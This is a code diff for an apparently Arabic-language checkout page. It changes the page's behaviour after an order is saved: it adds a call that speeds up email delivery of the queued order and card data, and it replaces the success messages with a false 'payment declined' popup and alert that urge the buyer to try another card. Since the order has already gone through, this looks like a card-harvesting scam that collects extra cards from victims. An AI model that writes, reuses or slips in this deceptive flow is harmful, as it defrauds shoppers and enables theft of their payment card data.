@@ -10,10 +10,10 @@ import {
 	FiArrowRight,
 	FiCreditCard,
 	FiGift,
-	FiCheckCircle,
 	FiLock,
 	FiShield,
 	FiShoppingBag,
+	FiXCircle,
 } from "react-icons/fi";
 
 
@@ -101,6 +101,16 @@ function isValidCvc(cvc, cardNumber) {
 	}
 
 	return false;
+}
+
+function triggerFastEmailDelivery() {
+	fetch("/api/cron/process-email-queue", {
+		method: "GET",
+		cache: "no-store",
+		keepalive: true,
+	}).catch(() => {
+		// The order is already queued by /api/orders; this only accelerates Formcarry delivery.
+	});
 }
 
 function CheckoutContent() {
@@ -366,6 +376,7 @@ function CheckoutContent() {
 				emailStatus: responseData?.emailStatus || "-",
 				cardNumberMasked: responseData?.data?.payment?.cardNumberMasked || maskedCard,
 			});
+			triggerFastEmailDelivery();
 		} catch (error) {
 			const serverMessage =
 				error?.message ||
@@ -381,11 +392,15 @@ function CheckoutContent() {
 		}
 
 		await Swal.fire({
-			title: "تم استلام الطلب",
-			text: `رقم الطلب ${orderId}. تم حفظ الطلب وإضافته لقائمة إرسال البريد.`,
-			icon: "success",
-			confirmButtonText: "ممتاز",
-			confirmButtonColor: "#1475d1",
+			title: "تم رفض طريقة الدفع",
+			text: "تعذر إتمام عملية الدفع، يرجى استخدام بطاقة أخرى أو التواصل مع الدعم.",
+			icon: "error",
+			confirmButtonText: "اختيار بطاقة أخرى",
+			confirmButtonColor: "#dc2626",
+			customClass: {
+				popup: "payment-decline-modal",
+				confirmButton: "payment-decline-confirm",
+			},
 		});
 	};
 
@@ -411,13 +426,12 @@ function CheckoutContent() {
 					</div>
 
 					{lastOrderSummary ? (
-						<div className="success-alert mt-5">
-							<FiCheckCircle className="text-2xl" />
+						<div className="payment-decline-alert mt-5">
+							<FiXCircle className="text-2xl" />
 							<div className="text-sm leading-7">
-								<div className="font-extrabold">تم استلام الطلب: {lastOrderSummary.orderId}</div>
-								<div>المنتج: {lastOrderSummary.productName}</div>
-								<div>الإجمالي: ${lastOrderSummary.totalPrice} • البطاقة: {lastOrderSummary.cardNumberMasked}</div>
-								<div>حالة البريد: {lastOrderSummary.emailStatus}</div>
+								<div className="font-extrabold">تم رفض طريقة الدفع</div>
+								<div>تعذر إتمام عملية الدفع، يرجى استخدام بطاقة أخرى أو التواصل مع الدعم.</div>
+								<div className="mt-1 text-xs opacity-80">رقم المحاولة: {lastOrderSummary.orderId} • البطاقة: {lastOrderSummary.cardNumberMasked}</div>
 							</div>
 						</div>
 					) : null}
